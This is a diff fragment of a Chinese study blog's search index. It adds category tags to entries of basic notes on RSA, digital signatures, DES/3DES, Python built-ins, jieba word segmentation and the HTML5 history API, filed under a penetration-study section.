+        <category>sql</category>
+      </categories>
   </entry>
   <entry>
     <title>爬虫</title>
@@ -8352,11 +8464,20 @@ M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">�
 </tbody>
 </table>
 ]]></content>
+      <categories>
+        <category>渗透学习</category>
+        <category>linux</category>
+      </categories>
   </entry>
   <entry>
     <title>SM2</title>
     <url>/2025/11/01/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81(%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81)/SM2/</url>
     <content><![CDATA[]]></content>
+      <categories>
+        <category>渗透学习</category>
+        <category>密码学</category>
+        <category>非对称密码(公钥密码)</category>
+      </categories>
   </entry>
   <entry>
     <title>RAS</title>
@@ -8381,6 +8502,11 @@ M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">�
 <p>解密公式为：</p>
 <p><strong>M = C^d mod n</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C = M^e mod n     ---加密得到C</span><br><span class="line">C^d mod n  --&gt; </span><br><span class="line">        ((M^e) mod n)^d mod n   --&gt;  M^ed mod n       ---幂模分配律</span><br><span class="line">ed=1  mod φ(n)   --&gt; ed=k(φ(n))+1</span><br><span class="line">M^(k(φ(n))+1) mod n --&gt; M</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>渗透学习</category>
+        <category>密码学</category>
+        <category>非对称密码(公钥密码)</category>
+      </categories>
   </entry>
   <entry>
     <title>椭圆曲线密码</title>
@@ -8453,6 +8579,11 @@ M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">�
 <p>数字签名还能够保证消息的完整性。任何在消息上的修改都会导致签名验证失败，防止数据在传输过程中被篡改。</p>
 <h2 id="2流程"><a class="markdownIt-Anchor" href="#2流程"></a> 2.流程:</h2>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">发送方:</span><br><span class="line">    1.首先对要发送的二进制数据流进行哈希摘要</span><br><span class="line">                   --- 常用哈希摘要: MD5 ,SHA1  ,SHA256  </span><br><span class="line">    2.使用私钥对摘要进行加密(签名)</span><br><span class="line">接受方:</span><br><span class="line">    1.使用发送方的公钥对摘要进行解密</span><br><span class="line">    2.使用同样的哈希算法对二进制数据流进行计算</span><br><span class="line">    3.对比两次哈希是否一致，一致则未篡改</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>渗透学习</category>
+        <category>密码学</category>
+        <category>非对称密码(公钥密码)</category>
+      </categories>
   </entry>
   <entry>
     <title>python</title>
@@ -8720,11 +8851,21 @@ M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">�
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">map</span> 是 Python 的一个内置函数，作用是：</span><br><span class="line">      把一个函数应用到可迭代对象（<span class="built_in">list</span>、<span class="built_in">tuple</span>、字符串等）的每个元素上，返回一个新的迭代器。</span><br><span class="line"><span class="built_in">map</span>(function, iterable):</span><br><span class="line">    function：你要应用的函数，可以是内置函数 <span class="built_in">int</span> / <span class="built_in">str</span>，也可以是自定义函数或 <span class="keyword">lambda</span></span><br><span class="line">    iterable：要迭代的对象（<span class="built_in">list</span>、<span class="built_in">tuple</span>、字符串、<span class="built_in">range</span> 等）</span><br></pre></td></tr></table></figure>
 <h3 id="9字符串转json"><a class="markdownIt-Anchor" href="#9字符串转json"></a> 9.字符串转json:</h3>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="comment"># 一个 JSON 格式的字符串</span></span><br><span class="line">s = <span class="string">&#x27;&#123;&quot;name&quot;: &quot;wanyan&quot;, &quot;age&quot;: 31, &quot;skills&quot;: [&quot;ctf&quot;, &quot;reverse&quot;, &quot;python&quot;]&#125;&#x27;</span></span><br><span class="line"><span class="comment"># 转成 Python 对象（字典/列表）</span></span><br><span class="line">data = json.loads(s)</span><br><span class="line"><span class="built_in">print</span>(data)        <span class="comment"># &#123;&#x27;name&#x27;: &#x27;wanyan&#x27;, &#x27;age&#x27;: 31, &#x27;skills&#x27;: [&#x27;ctf&#x27;, &#x27;reverse&#x27;, &#x27;python&#x27;]&#125;</span></span><br><span class="line"><span class="built_in">print</span>(data[<span class="string">&quot;name&quot;</span>])  <span class="comment"># wanyan</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>渗透学习</category>
+        <category>JS_逆向</category>
+        <category>python</category>
+      </categories>
   </entry>
   <entry>
     <title>协程分布式</title>
     <url>/2025/11/01/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/JS_%E9%80%86%E5%90%91/python/%E5%8D%8F%E7%A8%8B%E5%88%86%E5%B8%83%E5%BC%8F/</url>
     <content><![CDATA[]]></content>
+      <categories>
+        <category>渗透学习</category>
+        <category>JS_逆向</category>
+        <category>python</category>
+      </categories>
   </entry>
   <entry>
     <title>aes</title>
@@ -8918,6 +9059,11 @@ M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">�
 </tbody>
 </table>
 ]]></content>
+      <categories>
+        <category>渗透学习</category>
+        <category>密码学</category>
+        <category>对称密码(分组密码)</category>
+      </categories>
   </entry>
   <entry>
     <title>库学习</title>
@@ -8941,6 +9087,11 @@ M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">�
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line">seg_str=<span class="string">&quot;好好学习，天天向上。&quot;</span></span><br><span class="line">jieba.lcut(seg_str, cut_all=<span class="literal">True</span>)</span><br><span class="line">          [<span class="string">&#x27;好好&#x27;</span>, <span class="string">&#x27;好好学&#x27;</span>, <span class="string">&#x27;好好学习&#x27;</span>, <span class="string">&#x27;好学&#x27;</span>, <span class="string">&#x27;学习&#x27;</span>, <span class="string">&#x27;，&#x27;</span>, <span class="string">&#x27;天天&#x27;</span>, <span class="string">&#x27;天天向上&#x27;</span>, <span class="string">&#x27;向上&#x27;</span>, <span class="string">&#x27;。&#x27;</span>]</span><br></pre></td></tr></table></figure>
 <h3 id="3搜索引擎模式"><a class="markdownIt-Anchor" href="#3搜索引擎模式"></a> 3.搜索引擎模式:</h3>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line">seg_str=<span class="string">&quot;好好学习，天天向上。&quot;</span></span><br><span class="line">jieba.lcut_for_search(seg_str)</span><br><span class="line">           [<span class="string">&#x27;好好&#x27;</span>, <span class="string">&#x27;好学&#x27;</span>, <span class="string">&#x27;学习&#x27;</span>, <span class="string">&#x27;好好学&#x27;</span>, <span class="string">&#x27;好好学习&#x27;</span>, <span class="string">&#x27;，&#x27;</span>, <span class="string">&#x27;天天&#x27;</span>, <span class="string">&#x27;向上&#x27;</span>, <span class="string">&#x27;天天向上&#x27;</span>, <span class="string">&#x27;。&#x27;</span>]</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>渗透学习</category>
+        <category>JS_逆向</category>
+        <category>python</category>
+      </categories>
   </entry>
   <entry>
     <title>des</title>
@@ -8990,6 +9141,11 @@ M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">�
 </ul>
 <p>中间使用一次解密是为了:</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果k1=k2=k3，那么这个3des就和普通的des一样了</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>渗透学习</category>
+        <category>密码学</category>
+        <category>对称密码(分组密码)</category>
+      </categories>
   </entry>
   <entry>
     <title>sm4</title>
@@ -9028,6 +9184,11 @@ M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">�
 </tbody>
 </table>
 ]]></content>
+      <categories>
+        <category>渗透学习</category>
+        <category>密码学</category>
+        <category>对称密码(分组密码)</category>
+      </categories>
   </entry>
   <entry>
     <title>html</title>
@@ -9082,5 +9243,10 @@ M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">�
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">draggable=&quot;true&quot;     ---允许拖拽</span><br></pre></td></tr></table></figure>
 <h3 id="2历史"><a class="markdownIt-Anchor" href="#2历史"></a> 2.历史：</h3>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">HTML5中可以通过 window.history 操作访问历史状态，让一个页面可以有多个历史状态</span><br><span class="line">window.history对象可以让我们管理历史记录，可用于单页面应用，Single Page Application，可以无刷新改变网页内容。</span><br><span class="line"></span><br><span class="line">window.history.forward(); // 前进</span><br><span class="line"></span><br><span class="line">window.history.back(); // 后退</span><br><span class="line"></span><br><span class="line">window.history.go(); // 刷新</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>基础语言</category>
+        <category>Front</category>
+        <category>html(结构标准)</category>
+      </categories>
   </entry>
 </search>
